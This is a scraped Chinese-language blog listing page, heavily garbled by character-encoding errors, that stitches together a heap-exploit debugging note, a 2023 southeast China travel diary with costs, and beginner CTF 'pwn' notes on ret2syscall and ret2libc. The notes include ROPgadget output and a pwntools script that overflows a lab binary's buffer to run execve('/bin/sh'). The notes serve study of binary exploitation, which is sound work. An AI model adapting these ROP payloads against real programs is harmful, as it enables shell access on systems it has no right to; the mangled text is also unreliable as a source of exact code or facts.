p64(addr)edit(&quot;1&quot;,payload)edit(&quot;2&quot;,b&quot;aaaa&quot;)pause()print(io.recv(1024))#io.sendline(&quot;0&quot;)#print(io.recv(1024))



â€‹		ä½ å¾—ç†æ¸…æ¥šå“ªé‡Œéœ€è¦ç”¨bå“ªé‡Œä¸éœ€è¦
å’Œlibcç‰ˆæœ¬æœ‰å…³å—?  æ„Ÿè§‰åº”è¯¥æ²¡é—®é¢˜äº†çš„,ä½†æ˜¯æ‰“ä¸äº†
123456789101112130x6033d0:       0x00000000      0x00000000      0x000003b1      0x000\n&#x27;       â”‚00000[*] Pausedâ”‚0x6033e0:       0x61616161      0x0000000a      0x00000000      0x000 (press anâ”‚00000y to contiâ”‚0x6033f0:       0x0000000a      0x00000000      0x00000000      0x000nue)      â”‚00000           0x400bb8    call   0x400a14                      &lt;0x400a14&gt; input the note index to edit  sh.sendline(&quot;1&quot;)                   â”‚[DEBUG] Sent 0x2 bytes:              â”‚ â–º 0x400bbd    jmp    0x400bca                      &lt;0x400bca&gt;

â€‹		çœ‹äº†ä¸€ä¸‹ç”³è¯·çš„chunkå¤§å°ä¸æ­£å¸¸,æ€€ç–‘æ˜¯å‘é€è¿‡å»çš„æ•°æ®æœ‰é—®é¢˜,æ©,sendlineæœ‰é—®é¢˜
mov    rax, qword ptr fs:[0x28]  è¿™ä¸ªæ˜¯canaryå§
https://blog.csdn.net/counsellor/article/details/81005101
addr &#x3D; 0x06020D4 - 0x10 ä¸ºå•¥è¦-0x10å‘¢??         å› ä¸ºæ˜¯è¦å¾—åˆ°chunkçš„å¤´å§,ä¸æ˜¯æ•°æ®å¤´
æ€ä¹ˆè´Ÿæ•°äº†â€¦ addr &#x3D; 0x06020D4 - 0x12 å¤šå‡ç‚¹å€¼,è®©å®ƒè¦†ç›–çš„æ—¶å€™èƒ½è¦†ç›–ä¸Šå°±å¯ä»¥äº†

gdb + pwntoolsè°ƒè¯•</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/" title="2023å¹´åˆä¸œå—æ²¿æµ·æ—…æ¸¸æ¸¸è®°">2023å¹´åˆä¸œå—æ²¿æµ·æ—…æ¸¸æ¸¸è®°</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-02-19T11:45:14.000Z" title="å‘è¡¨äº 2023-02-19 19:45:14">2023-02-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-06-09T12:28:54.175Z" title="æ›´æ–°äº 2023-06-09 20:28:54">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%94%9F%E6%B4%BB/">ç”Ÿæ´»</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%97%85%E6%B8%B8/">æ—…æ¸¸</a></span></div><div class="content">â€‹		æ­¤ç‰ˆæœ¬æ˜¯ç»“æŸåçš„æ€»ç»“ç‰ˆæœ¬,ä¸æ˜¯ä¸€å¼€å§‹çš„è§„åˆ’ç‰ˆæœ¬,æ‰€ä»¥å¯èƒ½çœ‹èµ·æ¥ä¼šæ¯”è¾ƒå®Œç¾,ä½†å…¶å®ä¸­é—´è¸©è¿‡äº†æŒºå¤šå‘çš„,ä¼šåœ¨æœ€åæ€»ç»“.æ€»çš„æ¥è¯´,è¿™ä¸€æ¬¡çš„ä¸œå—æ¸¸å†,çœ‹åˆ°äº†ä¸åŒçš„é£åœŸäººæƒ…,å—æ–¹ç¡®å®å’ŒåŒ—æ–¹æœ‰å¾ˆå¤§çš„ä¸åŒ,äº†è§£äº†ä¸€äº›å†å²,åœ¨è·¯ä¸Šé‡åˆ°å¾ˆå¤šä¸ä¸€æ ·çš„äºº,çœ‹åˆ°äº†æ›´å¤§çš„ä¸–ç•Œ,æ›´é‡è¦çš„æ˜¯!!! åƒåˆ°äº†å¾ˆå¤šå¥½åƒçš„ğŸ˜‹!!!!!!!!!!
tips:ç›¸åŒèƒŒæ™¯é¢œè‰²ä¸ºæ™¯ç‚¹æŒ¨ç€
çºµè§ˆå›¾

1.31  æ­å·è·¯çº¿: æ·„åš â€” æµå—44 æµå— â€” æ­å· 450.5
è¡Œç¨‹: 12ç‚¹åŠåˆ°,ä¸‹åˆç©ä¸€ä¸‹åˆ,2.1ç©ä¸€å¤©,2.2ç©åŠå¤©,ä¸­åˆ12ç‚¹å‡ºå‘å»ç¦å·
ä½å®¿: æ­å·ä¸œç«™å›½é™…é’æ—…,åœ¨æ­å·ä¸œç«™è¾¹ä¸Š ä¸¤æ™š73 | è¯„ä»·:åœ°ç†ä½ç½®éå¸¸ä¼˜è¶Š,åºŠé“ºè¿˜æ˜¯æŒºèˆ’æœçš„,ä¸è¿‡ç¯å¢ƒä¸€èˆ¬,äººå¾ˆå¤š,æœ‰ä¸€äº›åº”è¯¥æ˜¯å¸¸ä½çš„,æ²¡æœ‰é‚£ç§ç‰¹åˆ«å¹´è½»çš„æ°›å›´.ä¸è¿‡æ€»ä½“æ¥è¯´è¿˜æ˜¯å¾ˆä¸é”™çš„! å¯ä»¥ç»™85åˆ†
ç¾é£Ÿ: ä¸œå¡è‚‰ã€è¥¿æ¹–é†‹é±¼ã€å«èŠ±é¸¡ã€å°ç¬¼åŒ… (å¾ˆé—æ†¾,éƒ½æ²¡æœ‰åƒå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ)
æ™¯ç‚¹: è¥¿æ¹–(æ–­æ¡¥æ®‹é›ª)ã€çµéšé£æ¥å³°(çµéšå¯º) 45å…ƒ(æ±‚18ç æ‰‹ä¸²)ã€é›·å³°å¡”40å…ƒï¼ˆç™»é«˜çœ‹è¥¿æ¹–ï¼‰ã€è¥¿æºªå›½å®¶æ¹¿åœ°å…¬å›­ã€æ¸…æ²³åŠè¡—ã€,äº¬æ­å¤§è¿æ²³ã€æµ™æ±Ÿåšç‰©é¦†(æ­¦æ—é¦†åŒº)(æå‰é¢„çº¦!)
æ€»ä¹‹åŸºæœ¬ä¸Šéƒ½æ˜¯å›´ç»•è¥¿æ¹–â€¦.æ™¯ç‚¹å¥½åƒæœ€è¿‘éƒ½å…è´¹äº†
ç¬¬ä¸€å¤©: ä¸‹è½¦åœ¨é™„è¿‘åƒä¸ªé¥­,æ”¾ä¸‹è¡Œæç›´å¥”åšç‰©é¦†ã€è¿æ²³å¹¿åœº(æ—è¾¹æœ‰ä¸€ä¸ªå¾ˆå¤§çš„è´­ç‰©ä¸­å¿ƒ),
ç¬¬äºŒå¤©: è¥¿æ¹–(çµéšå¯ºã€é›·å³°å¡”åœ¨é‡Œé¢)ã€ è¥¿æ¹–å¤ªå¤§äº†,æˆ‘è§‰å¾—ä¸€å¤©å…¶å®æ˜¯ç©ä¸å®Œçš„,è‡³å°‘éœ€è¦å®‰æ’ä¸¤å¤©çš„.
ç¬¬ä¸‰å¤©:ç¡è§‰ç¡äº†ä¸€ä¸Šåˆ,å› ä¸ºç¬¬äºŒå¤©èµ°å¾—å¤ªç´¯äº†
æœºåŠ¨: æ­¦æ—é—¨ç å¤´ æ°´ä¸Šå·´å£«3å…ƒ äº¬æ­å¤§è¿æ²³æ™š7ç‚¹å’Œ8ç‚¹20å‘èˆ¹,å¤œæ¸¸ 120&#x2F;äºº.  åœ¨æ‹±å¢…åŒºäº¬æ­å¤§è¿æ²³å¹¿åœº(èµ°çš„åŠ¨çš„è¯å¯ä»¥æ²¿ç€æ²³èµ°â€¦)

æµ™æ±Ÿçœåšç‰©é¦†â€‹		æµ™æ±Ÿç¡®å®æ˜¯å¯Œé¥¶ä¹‹åœ°,é¦†è—ä¸°å¯Œ,è¿˜æ˜¯å€¼å¾—ä¸€çœ‹çš„â€¦æ²¡å•¥æ–‡åŒ–â€¦è¯´ä¸å‡ºæ¥åˆ«çš„â€¦æ¯”è¾ƒéœ‡æ’¼çš„æ˜¯çœ‹åˆ°äº†ã€Šæ–°é’å¹´ã€‹,åœ¨å†å²ä¹¦äº†è§£åˆ°è¿™äº›çš„æ—¶å€™å¯èƒ½è¿˜æ²¡æœ‰é‚£ä¹ˆéœ‡æ’¼,å½“çœ‹åˆ°äº†çœŸçš„ä¹¦ä¹‹å,ä»¿ä½›å›åˆ°äº†é‚£ä¸€æ®µå†å².


äº¬æ­å¤§è¿æ²³æ²¿å²¸

è¥¿æ¹–
 
çµéšå¯º
é’±å¡˜æ±Ÿ
æ€»ç»“


è¥¿æºªå›½å®¶æ¹¿åœ°å…¬å›­å†¬å¤©å»ä¸æ˜¯å¾ˆå¥½ç©,å› ä¸ºéƒ½æ¯äº†â€¦â€¦..ä¸å¦‚å¤å¤©å».
2.2  ç¦å·è·¯çº¿: æ­å· â€” ç¦å· 268
è¡Œç¨‹: ä¸‹åˆ5ç‚¹åˆ°åˆ°,æ™šä¸Šç©ä¸€ç©,2.3ç©ä¸€å¤©,2.4æ—©ä¸Š7.30å»é¾™å²©,
ä½å®¿: xxxé’å¹´æ—…èˆ é è¿‘ç¦å·ç«™ 88ä¸¤æ™š
ç¾é£Ÿ: é±¼ä¸¸ã€å¤ªæèŠ‹æ³¥ã€å’¸æ—¶ã€è‚‰ç‡•ã€
æ™¯ç‚¹: ç¦å»ºåšç‰©é¦†(ä¸‰æ˜Ÿå †!æ— éœ€é¢„çº¦ã€60å…ƒ)ã€ä¸‰åŠä¸ƒå··ã€è¾¾æ˜å°åƒè¡—
ç¬¬ä¸€å¤©:  éšä¾¿é€›é€›
ç¬¬äºŒå¤©:  ä¸‰åŠä¸ƒå··ã€ç¦å»ºåšç‰©é¦†
æ¥ç¦å·ä¸»è¦æ˜¯æ„Ÿå—ç¦å»ºçš„é£åœŸäººæƒ…
ä¸‰åŠä¸ƒå··
æ—åˆ™å¾çºªå¿µé¦†
ç¦å»ºåšç‰©é¦†     
å—æ¾³æµ·æ»©
è¾¾æ˜å°åƒè¡—2.4 é¾™å²©è·¯çº¿: ç¦å· â€” é¾™å²© 142
è¡Œç¨‹: 10.56åˆ°é¾™å²©,å’Œè‘£å“¥åƒé¥­,ä¸‹åˆæ™šä¸Šç©ä¸€ç©ã€5å·æ—©ä¸Š9ç‚¹å»å¦é—¨
ä½å®¿: è‘£å“¥å®¶é‡Œ
æ™¯ç‚¹: çœ‹æ°¸å®šåœŸæ¥¼,å®¢å®¶æ–‡åŒ–
ç¬¬ä¸€å¤©:  åƒé¥­ã€åœŸæ¥¼
æ°¸å®šåœŸæ¥¼
å¤ç”°ä¼šè®®ä¼šå€

2.5 å¦é—¨è·¯çº¿: é¾™å²© â€” å¦é—¨ 23.5
è¡Œç¨‹: 10.50åˆ°å¦é—¨,5å·ç©åŠå¤©,6å·ç©ä¸€å¤©,7å·æ—©ä¸Š7.55å‡ºå‘åˆ°æ·±åœ³
ä½å®¿: é’å¹´æ—…èˆ å¦é—¨ç«™è¾¹ä¸Š 118ä¸¤æ™š
ç¾é£Ÿ: æµ·é²œè‡ªåŠ©!!!!!! æ²™èŒ¶é¢ã€é±¼ä¸¸æ±¤ã€èšµä»”ç…ã€å§œæ¯é¸­ã€æ˜¥å·
æ™¯ç‚¹: é¼“æµªå±¿(35å…ƒã€ä¸€å®šæå‰å‡ å¤©è®¢èˆ¹ç¥¨ã€æ—ºå­£æå‰åŠä¸ªæœˆ)ã€ å—æ™®é™€å¯º(éœ€è¦é¢„çº¦)ã€ç¯å²›è·¯(éª‘è¡Œ)ã€æ²™æ»©ã€ åœ°é“1å·çº¿æ˜¯æµ·ä¸Šåœ°é“!
å»é¼“æµªå±¿: å¦é—¨é‚®è½®ä¸­å¿ƒå¦é¼“ç å¤´(æå‰1å°æ—¶åˆ°)(35å…ƒ)  å¾®ä¿¡å°ç¨‹åº:å¦é—¨è½®æ¸¡+
ç¦»å²›: ä¸‰ä¸˜ç”°ç å¤´ â€” å¦é—¨è½®æ¸¡ç å¤´
ç¬¬ä¸€å¤©: ä¸­å±±è·¯æ­¥è¡Œè¡—ã€å—æ™®é™€å¯ºã€ç¯å²›è·¯ è¿™å‡ ä¸ªéƒ½åœ¨ä½å®¿é™„è¿‘,
ç¬¬äºŒå¤©:  2.6 æ—©ä¸Šç™»å²›é¼“æµªå±¿,ä¸‹åˆç¦»å²›

å¦é—¨åœ°é“
å¦é—¨æ¤ç‰©å›­é¼“æµªå±¿å—æ™®é™€å¯ºæµ·é²œè‡ªåŠ©2.7 æ·±åœ³è·¯çº¿: å¦é—¨åŒ— â€” æ·±åœ³åŒ— 125
è¡Œç¨‹: ä¸­åˆ11ç‚¹åˆ°,7å·ç©åŠå¤©,8å·ä¸‹åˆ2ç‚¹å‡ºå‘å»å¹¿å·
ä½å®¿: xxé’å¹´æ—…èˆ 42ä¸€æ™š,æ·±åœ³åŒ—ç«™é™„è¿‘
æ™¯ç‚¹: æ·±åœ³æ¹¾å…¬å›­ã€æ·±åœ³ä¸–ç•Œä¹‹çª—(220å…ƒ)ã€ä¸»è¦æ¥è¿™é‡Œæ„Ÿå—å¤§åŸå¸‚çš„ç¹å2333
ç¬¬ä¸€å¤©: æ·±åœ³æ¹¾å…¬å›­ã€ä¸–ç•Œä¹‹çª—(å¾…è€ƒè™‘
ç¬¬äºŒå¤©: å»æ‰¾åŒå­¦ç©å‘€!!! ç¥ä»™é™¢çš„

ç¥ä»™é™¢2.8 å¹¿å·è·¯çº¿ æ·±åœ³ â€” å¹¿å· 21.5
è¡Œç¨‹: 8å·ä¸‹åˆ3.40åˆ°å¹¿å·,ç©åŠå¤©,9å·ä¸€å¤©,10å·ä¸­åˆå¯ç¨‹å›å®¶ã€2.10å·è¿”ç¨‹  å›æ¥æœºç¥¨ 439
ä½å®¿: xxxé’å¹´æ—…èˆ 120ä¸¤æ™š,åœ¨å¸‚åŒº(å¹¿å·å¡”å¯¹é¢)
ç¾é£Ÿ: æ—©èŒ¶! è‚ ç²‰ã€ç…²ä»”é¥­ã€è‰‡ä»”ç²¥
æ™¯ç‚¹:  å¹¿ä¸œçœåšç‰©é¦†(é¢„çº¦!)ã€å¹¿å·å¡”ã€ç æ±Ÿå¤œæ¸¸(æ°´ä¸Šå·´å£«)ã€ä¸Šä¸‹ä¹æ­¥è¡Œè¡—
ç¬¬ä¸€å¤©: ä¸‹åˆåˆ°äº†,åˆ°å¤„é€›é€›,ç„¶åå¤œæ¸¸ç æ±Ÿ,æ™šä¸Šçœ‹çœ‹å¹¿å·å¡”(æœ€ç¾ä¸ƒå…¬é‡Œ æœ‰è½¨ç”µè½¦!)
ç¬¬äºŒå¤©:å¹¿ä¸œçœåšç‰©é¦†ã€
ç¬¬ä¸‰å¤©:  10ç‚¹å·¦å³å‡†å¤‡å»æœºåœºäº†,  æœºç¥¨430

å°è›®è…°å¹¿ä¸œåšç‰©é¦†é™ˆå®¶ç¥ å—è¶Šç‹åšç‰©é¦†å¤§ä½›å¯ºå¥½åƒçš„è‚ ç²‰æ—©èŒ¶èŠ±é”€é¢„ç®— + å®é™…èŠ±è´¹è·¯è´¹: 44 + 450.5 + 268 + 142 + 23.5 + 125 + 21.5 + 439 &#x3D; 1513.5
ä½å®¿: 73 + 88 + 118 + 42 + 120 &#x3D; 441
é—¨ç¥¨: 365
å…¶ä»–: èˆ¹ç¥¨ 35
é¥®é£Ÿ: 30 * 10 åŸºç¡€ + 300 ç‰¹è‰²é£Ÿç‰©
åƒé¥­è®°å¾—å‡è‚¥, æ—©é¤æ™šé¤å°‘åƒ,å¯ä»¥åƒä¸€ç‚¹å½“åœ°ç‰¹è‰²é£Ÿç‰©
æ€»è®¡: 1513.5 + 441 + 365 + 35 + 600 &#x3D; 2954.5å…ƒ -220ï¼ˆä¸å»ä¸–ç•Œä¹‹çª—äº†ï¼‰-45ï¼ˆçµéšå¯ºå…è´¹äº†ï¼‰
å®é™…èŠ±è´¹: æˆ‘æ‡’å¾—ç®—äº†â€¦â€¦..æ€»ä¹‹â€¦.é¥®é£Ÿæ–¹ä¾¿é¢„ç®—å¤ªå°‘äº†,è™½ç„¶è‡ªå·±æƒ³å‡è‚¥,ä½†æ˜¯æ¯å¤©ä½“åŠ›æ¶ˆè€—å¤ªå¤§,æ¯å¤©å¹³å‡18000æ­¥,ä¸åƒå¥½æ‰›ä¸ä½â€¦..æœ€åèŠ±é”€åº”è¯¥åœ¨4500å·¦å³å§
ç»éªŒæ•™è®­0.åœ¨å®¶é çˆ¶æ¯,å‡ºé—¨é æœ‹å‹! å¤šäº¤ä¸€ç‚¹(é è°±çš„)æœ‹å‹è¿˜æ˜¯å¾ˆå¥½çš„!!  å»é¾™å²©æ‰¾çš„æ˜¯æœ¬ç§‘åŒå­¦,ç©çš„è¿˜ä¸é”™,éå¸¸å®¢æ°”,æå¾—æˆ‘ä¸å¤ªå¥½æ„æ€ğŸ˜‚. åœ¨æ·±åœ³æ˜¯ ç¤¾æç¾¤é‡Œçš„ ç¥ä»™é™¢çš„æ ¡å‹hhhh,éå¸¸çƒ­æƒ…,å¸¦ç€åƒé¥­å’Œé€›ç¥ä»™é™¢. åœ¨å¹¿å·çš„è¯,æ˜¯å¹´å‰åœ¨æ´›é˜³æ—…æ¸¸ç¢°åˆ°çš„ä¸‰ä¸ªä¿¡ä½›çš„å§å§,äººéå¸¸å¥½,ç»™æˆ‘å‡†å¤‡äº†ç¤¼ç‰©è¿˜è¯·æˆ‘åƒé¥­,å¤§æ„äº†,æˆ‘å½“æ—¶è€ƒè™‘è¿‡è¦ä¸è¦å‡†å¤‡ç¤¼ç‰©..åé¢å¿˜äº†â€¦â€¦
1.æ—…æ¸¸æ˜¯å¾ˆç´¯çš„,è¦æ¶ˆè€—ä½“åŠ›çš„,æ˜¯å¯ä»¥å‡è‚¥çš„,ä½†æ˜¯æ•ˆæœä¸ä¼šæœ‰æƒ³è±¡çš„é‚£ä¹ˆå¥½(æ¯•ç«Ÿä¹Ÿè¦å¥½å¥½åƒé¥­,ä¸ç„¶æ²¡åŠ›æ°”ç©äº†!!)
2.åƒå½“åœ°ç‰¹è‰²æœ‰çš„ç¾é£Ÿè¡—è¿˜æ˜¯ä¸é”™çš„,ä½†æœ€å¥½çš„è¿˜æ˜¯åœ¨å±…æ°‘èšå±…çš„åœ°æ–¹!
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" title="pwnå…¥é—¨-é‡åˆ°çš„å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜åŠè§£å†³åŠæ³•">pwnå…¥é—¨-é‡åˆ°çš„å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜åŠè§£å†³åŠæ³•</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-02-19T03:17:23.000Z" title="å‘è¡¨äº 2023-02-19 11:17:23">2023-02-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-06-09T12:27:11.275Z" title="æ›´æ–°äº 2023-06-09 20:27:11">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span></div><div class="content">gcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,â€“dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c
&#x3D;&gt; 0x563e8cd58c31 &lt;main+395&gt;:	lea    rdi,[rip+0xbd5]        # 0x563e8cd5980d

</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/" title="pwnå…¥é—¨-9-æ ˆæº¢å‡ºret2ç³»åˆ—">pwnå…¥é—¨-9-æ ˆæº¢å‡ºret2ç³»åˆ—</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-02-18T07:10:56.000Z" title="å‘è¡¨äº 2023-02-18 15:10:56">2023-02-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-02-26T01:42:58.366Z" title="æ›´æ–°äº 2023-02-26 09:42:58">2023-02-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">è¿™éƒ¨åˆ†ä¸»è¦æ¥æºäºctf-wiki
ret2syscallâ€‹		è¿™ä¸ªå…¶å®å°±æ˜¯åˆ©ç”¨äº†ç³»ç»Ÿè°ƒç”¨(syscall), ä»€ä¹ˆæ˜¯ç³»ç»Ÿè°ƒç”¨å‘¢? å‚çœ‹åŸºç¡€çŸ¥è¯†ç¯‡,è¿™é‡Œæ²¡æœ‰systemäº†,ä½†æ˜¯ä¸å½±å“getshell,å› ä¸ºsystemçš„åº•å±‚æ˜¯è°ƒç”¨çš„execveç³»ç»Ÿè°ƒç”¨,æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°gadget,æ¥æ„é€ ç³»ç»Ÿè°ƒç”¨,è°ƒç”¨execve,ç„¶åä¼ å…¥å‚æ•°&#x2F;bin&#x2F;sh,å³å¯. å³ execve(â€œ&#x2F;bin&#x2F;shâ€)
â€‹		é’ˆå¯¹ç³»ç»Ÿè°ƒç”¨è¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„åˆ©ç”¨æ–¹æ³•,æ¯”å¦‚ç»å…¸çš„ROW,å°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä¸èƒ½å¤Ÿæ‰§è¡Œexecve getshellçš„è¯,æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•è¯»å–flag,æ¯•ç«Ÿæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ‹¿åˆ°flag,å¯ä»¥è¿›è¡Œread open writeå°†flagå†™å…¥ä¸€ä¸ªåœ°æ–¹,ç„¶åæ‰“å°å‡ºæ¥å³å¯.(åé¢å†å†™ç›¸å…³çš„)
â€‹		è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯ execve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL),ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ä¸æ˜¯æ ¹æ®é‚£ä¸ªè°ƒç”¨çº¦å®šäº†.  ä¸ç”¨æ ˆä¼ å‚äº†,éƒ½éœ€è¦ç”¨åˆ°å¯„å­˜å™¨eax ebx ecx edx åˆ†åˆ«å­˜æ”¾ ç³»ç»Ÿè°ƒç”¨å·å’Œç¬¬ 1 2 3 ä¸ªå‚æ•°, æ‰€ä»¥ä»–ä»¬çš„å€¼åˆ†åˆ«ä¸º 0xb &#x2F;bin&#x2F;sh 0 0 , .rodata:080BE408 aBinSh          db â€˜&#x2F;bin&#x2F;shâ€™,0  è¿™ä¸ªåœ°å€é‡Œå­˜æ”¾ç€&#x2F;bin&#x2F;sh
buf 108 + 4 ebp + retaddress 
å¯»æ‰¾gadgetâ€‹		è¦æ‰¾åˆ°int 0x80 gadget,ä»¥åŠé‚£å‡ ä¸ªpop, åˆ©ç”¨ROPgadget ,å…·ä½“è¯­å¥åŠç»“æœå¦‚ä¸‹
123456789ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27; ROPgadget --binary ret2syscall  --only &#x27;int&#x27;  0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x080bb196 : pop eax ; ret  0x08049421 : int 0x80    



expæ‰€ä»¥payloadæ„é€ å¦‚ä¸‹binsh &#x3D; 0x080BE408edxecxebx &#x3D; 0x0806eb90eaxret &#x3D; 0x080bb196int80 &#x3D; 0x08049421payload &#x3D; bâ€aâ€*(108 + 4) + p32(eaxret)  + p32(0xb) + p32(edxecxebx) + p32(0) + p32(0) + p32(0x080BE408) + p32(int80)
1234567891011121314151617from pwn import *context.log_level= &quot;debug&quot;sh = process(&quot;./ret2syscall&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(sh,&quot;break *0x8048e96&quot;)binsh = 0x080BE408edxecxebx = 0x0806eb90eaxret = 0x080bb196int80 = 0x08049421payload = b&quot;a&quot;*(108 + 4) + p32(eaxret)  + p32(0xb) + p32(edxecxebx) + p32(0) + p32(0) + p32(0x080BE408)+p32(int80)  sh.send(payload)sh.interactive()



å…³äºespå’Œretçš„å…³ç³»,retåespæ€ä¹ˆç§»åŠ¨ç­‰,éœ€è¦å†çœ‹çœ‹
Pop ä¸€æ¬¡å, espå¾€é«˜åœ°å€ç§»åŠ¨ä¸€ä¸ªåœ°å€




ä¸ºä»€ä¹ˆretåå°±åˆ°äº†æ ˆçš„ä¸‹ä¸€ä¸ªåœ°å€???
retçš„æ—¶å€™, espå°±æŒ‡å‘äº†è¿”å›åœ°å€é‚£ä¸€è¡Œ,æ‰§è¡Œå®Œpopå,espç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªgadget,ç„¶åretå¼¹å‡ºè¿™ä¸ªgadgetçš„åœ°å€,ä½œä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤,ç”±æ­¤ä¸€æ­¥æ­¥è·Ÿè¿›

ret2libcâ€‹		æ‰§è¡Œlibcä¸­çš„å‡½æ•°,ä¸€ä¸ªå…³é”®ç‚¹æ˜¯æ‰¾å¯¹libcç‰ˆæœ¬.
â€‹		é€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)(å®ƒä»¬çš„å…³ç³»???????)
re2libc1â€‹		åæ±‡ç¼–ä»£ç 
â€‹		å…ˆä»å®ƒè‡ªèº«å¯»æ‰¾systemå’Œ&#x2F;bin&#x2F;sh
12345678ROPgadget --binary ret2libc1 --string &#x27;/bin/sh&#x27;    0x08048720 : /bin/sh  # objdump -d ret2libc1 | grep &quot;system&quot;08048460 &lt;system@plt&gt;:8048611:	e8 4a fe ff ff       	call   8048460 &lt;system@plt&gt;

â€‹		å…¶æ´»äº†,å°±è¦†ç›–è¿”å›åœ°å€ä¸ºsystem,ç„¶åç»™å®ƒä¼ å‚å°±å¥½äº†,é—®é¢˜æ˜¯æ€ä¹ˆä¼ å‚å‘¢?æ ˆçš„ç»“æ„æ˜¯æ€æ ·çš„?

â€‹		å½“èµ°åˆ°è¿”å›åœ°å€è¿™é‡Œæ—¶,è¿›å…¥call system,å°±ç›¸å½“äºæ–°è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°,
â€‹		è¯´å®è¯è¿™é‡Œè¿˜æ˜¯ä¸å¤ªæ‡‚æµç¨‹,ä¸è¿‡æœ€å¥½çš„åŠæ³•å°±æ˜¯è‡ªå·±å»è°ƒè¯•! 
1234â–º 0xf7e4c623 &lt;gets+291&gt;    push   ecx                           &lt;_IO_2_1_stdin_&gt;  0xf7e4c624 &lt;gets+292&gt;    call   __uflow                    &lt;__uflow&gt;  0xf7e4c629 &lt;gets+297&gt;    add    esp, 0x10

â€‹		åœ¨è¿”å›åˆ°systemæ—¶,æ ˆçš„ç»“æ„å°±æ˜¯è¿™æ ·å­çš„äº†,ç¬¦åˆä¸Šå›¾..ä½†ä¹Ÿæ²¡å•¥â€¦è¿˜æ˜¯çœ‹ä¹¦æŠŠ..å‚è§ä¸‹é¢ä¸€ç« èŠ‚
1200:0000â”‚ esp 0xffffd4e0 â—‚â€” 0x001:0004â”‚     0xffffd4e4 â€”â–¸ 0x8048720 â—‚â€” das     /* &#x27;/bin/sh&#x27; */

â€‹		æ‰¾åˆ°äº†ä¿©åœ°å€ä¹‹å¤–,è¿˜è¦æ‰¾å¥½åç§»,æ‰¾åç§»æœ‰å¾ˆå¤šç§æ–¹æ³•
â€‹		&#x2F;&#x2F; [sp+1Ch] [bp-64h]@1 è¿™ä¸ªå¯ä»¥å—?  
